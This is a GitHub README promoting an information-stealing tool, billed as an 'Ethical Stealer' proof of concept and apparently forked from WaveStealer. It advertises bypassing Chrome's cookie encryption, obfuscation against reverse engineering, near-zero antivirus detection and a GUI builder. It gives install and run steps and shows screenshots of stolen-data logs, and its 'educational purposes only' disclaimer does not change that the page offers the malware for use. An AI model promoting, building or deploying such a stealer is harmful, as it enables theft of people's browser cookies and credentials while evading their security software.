# Ethical Stealer Proof of Concept

![LoudProject Logo](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png)

## Disclaimer ⚠️

This project is a **Proof of Concept** and **intended for educational purposes only**. It is designed to demonstrate the capabilities of bypassing encryption mechanisms and handling sensitive data in a secure, controlled environment. **Use this tool responsibly** and **do not engage in any illegal activities**.

The author is not responsible for any misuse or damages caused by the use of this software. It is your responsibility to ensure that the usage complies with all applicable laws and regulations.

## Features 🚀

- **Ethical Stealer**: A tool designed for educational and proof of concept purposes.
- **Bypasses Chrome's Latest Cookie Encryption**: Leveraging **Bun** for its rapid speed and robust obfuscation to bypass modern encryption techniques used by Chrome.
- **Compiled with Bun and `pkg`**: Offering minimal detection rates (0% with Bun, 2% with `pkg`).
- **Obfuscation**: Using `javascript-obfuscator` for basic obfuscation to prevent reverse engineering.

## Preview 👀

### Bun Build Detection (0% Detection)

![Bun Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/BunBuildDetection%20.png)

### Pkg Build Detection (2% Detection)

![Pkg Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/PkgBuildDetection.png)

### GUI Builder Intuitive (electronJs)

![GUI](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/electronGui.png)

### Logs Execution Preview (Fork WaveStealer)

![logs](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(1).png)
![logs1](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(3).png)
![logs2](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(2).png)


## Installation ⚙️

Before you begin, ensure that you have the following dependencies installed:

1. **Python 3.9 or above**: You can download the latest version of Python from [python.org](https://www.python.org/downloads/).

2. **Node.js Version lower than v21 (v16 recommended)**: Download and install Node.js from [Node.js v16 download](https://nodejs.org/dist/v16.20.2/node-v16.20.2-x64.msi).

3. **Visual Studio Installer** (for C++ support): Download and install Visual Studio with the **Desktop development with C++** workload. This is required for building and compiling C++ modules in the project.

4. **Bun**: This will be automatically installed when you run the `start.bat` script. Bun provides lightning-fast builds and optimizes the execution of JavaScript code, making it ideal for this proof of concept.

5. **`pkg`**: Also installed automatically via the `start.bat` script. `pkg` is used for compiling the project into an executable file.

To install all dependencies, simply run the following:

- Download the required installers and follow their installation steps.
- Then, run `start.bat` to install Python, Bun, and `pkg` automatically.

## How to Run 🖥️

1. **Clone the repository**:
   `git clone https://github.com/wompless/Loud-Project.git`

   `cd Loud-Project`

2. **Install dependencies**:
   After ensuring that you have Python, Node.js, and Visual Studio installed, run the following to install all necessary Node.js modules:
   `npm install`

3. **Start the application**:
   - For a simple launch, just run `start.bat`, which will handle everything for you, including starting the application and installing dependencies.
   - Alternatively, you can start the application manually via:
     `npm start`

4. The application will open a GUI built with **Electron**, where you can interact with the tool.

## Why Bun is Incredible 🏎️

**Bun** is a modern, ultra-fast JavaScript runtime that is built from scratch with performance in mind. By using Bun, we achieve **significant speed improvements** in both the execution of JavaScript code and the build process, which is critical when dealing with a proof-of-concept project like this one.

With **Bun**, the detection rate of the compiled executable is **0%**, making it incredibly stealthy and bypassing advanced detection mechanisms. 

In contrast, using **pkg** for compiling results in a **2% detection rate**, but still provides a fast and effective solution for bundling the application into an executable file.

**Bun** optimizes the encryption bypass process, particularly in dealing with Chrome’s **latest cookie encryption**, which was previously a challenge to overcome. By leveraging Bun's efficiency, we are able to execute decryption tasks with **minimal overhead**.

## Mentions ✨
 
I would like to give special thanks to the following individuals who have greatly contributed to the development of this project:
 
 - **Kisakay**: [GitHub Profile](https://github.com/Kisakay)
 - **TanevAZ**: [GitHub Profile](https://github.com/TanevAZ)
 - **VInzui**: [GitHub Profile](https://github.com/Vinzui)
 - **covllld**: [GitHub Profile](https://github.com/covllld)
 
Additionally, a shoutout to **Wave** for the stealer source that helped in shaping this project.
 
## Contact 📱

If you have any questions, concerns, or abuse reports, please contact us via Telegram:

[Telegram: @LoudProject](https://t.me/LoudProject)

---

**Note:** This is a **Proof of Concept**. It should only be used for educational purposes in a controlled environment.
